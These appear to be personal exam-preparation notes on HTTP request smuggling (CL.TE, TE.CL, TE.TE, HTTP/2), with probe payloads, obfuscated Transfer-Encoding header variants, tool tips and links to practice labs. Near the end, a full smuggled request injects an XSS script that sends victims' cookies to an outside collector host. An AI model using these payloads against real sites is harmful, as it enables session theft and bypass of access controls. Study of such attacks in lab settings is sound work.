## Stage 1 + 2
### What is it?
HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests. Request smuggling is primarily associated with HTTP/1 requests. Involves the `Content-Length` and `Transfer-Encoding` headers.
- CL.TE: the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header.
- TE.CL: the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header.
- TE.TE: the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers can be induced not to process it by obfuscating the header in some way.
> This is mainly only possible on HTTP/1.1 -- there are other ways to exploit HTTP/2
![[HTTP Request Smuggling-20251103204354061.png|465]]
### Impact
- Bypassing frontend security controls
	- Example: Admin portal is blocked, HTTP Request Smuggling could bypass it
### Main Goal
Retrieve victim's session id.
![[HTTP Request Smuggling-20260201091751877.png|628]]
![[HTTP Request Smuggling-20260201204128510.png|413]]

Learn how to use HTTP Request Smuggler BApp extension to automate the process instead of testing it manually (like all the videos show). [Quick video on how to use it](https://www.youtube.com/watch?v=BF8rQezulzg).

### HRS vulns on the exam
**TE.CL with a quote bypass** — One documented variant uses `Transfer-Encoding: "chunked"` (with quotes to obfuscate it from the front-end), combined with a smuggled request that injects an XSS payload into the `User-Agent` header of a comment or search endpoint to steal a victim's cookie. [PyUs3r Blog](https://py-us3r.github.io/bscp-roadmap-bscproadmap/)

**CL.TE with a duplicate Transfer-Encoding** — Another variant uses two `Transfer-Encoding` headers (one obfuscated, e.g. `Transfer-Encoding: ORHFSuL`) alongside a `Content-Length`, then smuggles a `GET` request with an XSS payload in the `User-Agent`. [PyUs3r Blog](https://py-us3r.github.io/bscp-roadmap-bscproadmap/)


### Payloads
^osmqx6
Ensure it is a `POST` request + HTTP/1.1
```
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X


```

TE.CL payload
```
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

HTTP/2 Payload
```
Transfer-Encoding: chunked

0

GET /doesntExist HTTP/1.1
X-Ignore: x
```

### Identify Vulnerabilities in Exam
- Use HTTP Request Smuggler > Smuggle probe or HTTP/2 Probe

#### Automated
Possible HTTP Request Smuggling: CL.TE multiCase (delayed response)
![[README - skipped-20260222154439108.png]]
- `UserAgent` reflected in response
	- **COOKIE STEALER**: [[CL.TE#1.7. Lab Exploiting HTTP request smuggling to deliver reflected XSS ⭕️]]
- [[CL.TE#1.1. Lab HTTP request smuggling, confirming a CL.TE vulnerability via differential responses ⭕️]]
- HTTP Request Smuggling Confirmed: G-multiCase
	- [[CL.TE#1.x. Lab HTTP request smuggling, basic CL.TE vulnerability ⭕️]]

Possible HTTP Request Smuggling: CL.TE options （delayed response）
- **Bypass Admin (Stage 2)** [[CL.TE#1.3. Lab Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability ⭕️]]
- **Cookie stealer** [[Others#1.6. Lab Exploiting HTTP request smuggling to capture other users' requests ⭕️]]

Possible HTTP Request Smuggling: TE.CL multiCase （delayed response）
- [[TE.CL#1.2. Lab HTTP request smuggling, confirming a TE.CL vulnerability via differential responses ⭕️]]
- [[TE.CL#1.x. Lab HTTP request smuggling, basic TE.CL vulnerability ⭕️]]
- **Bypass Admin (Stage 2)** [[TE.CL#1.4. Lab Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability ⭕️]]

HTTP/2 Probe
HTTP/2 TE desync v10a options
- **Cookie stealer** [[HTTP2#1.8. Lab Response queue poisoning via H2.TE request smuggling ⭕️]]
- **Cookie stealer** [[HTTP2#1.10. Lab HTTP/2 request smuggling via CRLF injection ⭕️]]


**THIS DOESN'T WORK. User-Agent isn't reflected in response**
![[README-20260222171408585.png]]
Possible HTTP Request Smuggling: CL.TE revdualchunk （delayed response)
- **Cookie stealer**  [[Others#1.x. Lab HTTP request smuggling, obfuscating the TE header ⭕️]]
Lab used `Transfer-encoding: identity` to solve. In the exam, try the rest.
```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked

Transfer-encoding: identity
Transfer-encoding: cow
```

```
POST / HTTP/1.1
Host: TARGET.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: identity

e6
GET /post?postId=4 HTTP/1.1
User-Agent: a"/><script>document.location='http://OASTIFY.COM/?c='+document.cookie;</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0\r\n  
\r\n
  
```


#### Manual
500 Internal Server Error
- "Server Error: Communication timed out"
	- `User-Agent` reflected in response in `GET /post?postId=`
		- **COOKIE STEALER** [[CL.TE#1.7. Lab Exploiting HTTP request smuggling to deliver reflected XSS ⭕️]]
	- [[CL.TE#1.1. Lab HTTP request smuggling, confirming a CL.TE vulnerability via differential responses ⭕️]]
	- [[CL.TE#1.3. Lab Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability ⭕️]]
	- [[Others#1.5. Lab Exploiting HTTP request smuggling to reveal front-end request rewriting ⭕️]]
	- [[CL.TE#1.x. Lab HTTP request smuggling, basic CL.TE vulnerability ⭕️]]

- [[Others#1.6. Lab Exploiting HTTP request smuggling to capture other users' requests ⭕️]]


400 Bad Request
- "Invalid request"
	- Using TE.CL payload == 500 "Communication timed out"
		- [[TE.CL#1.2. Lab HTTP request smuggling, confirming a TE.CL vulnerability via differential responses ⭕️]]
		- [[TE.CL#1.x. Lab HTTP request smuggling, basic TE.CL vulnerability ⭕️]]
- [[Others#1.x. Lab CL.0 request smuggling ⭕️]]


- [[Others#1.x. Lab CL.0 request smuggling ⭕️]]
- [[TE.CL#1.4. Lab Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability ⭕️]]
- [[HTTP2#1.8. Lab Response queue poisoning via H2.TE request smuggling ⭕️]]
- [[HTTP2#1.11. Lab HTTP/2 request splitting via CRLF injection ⭕️]]
- [[HTTP2#1.10. Lab HTTP/2 request smuggling via CRLF injection ⭕️]]
- "Both chunked encoding and content-length were specified"
	- [[HTTP2#1.9. Lab H2.CL request smuggling ⭕️]]

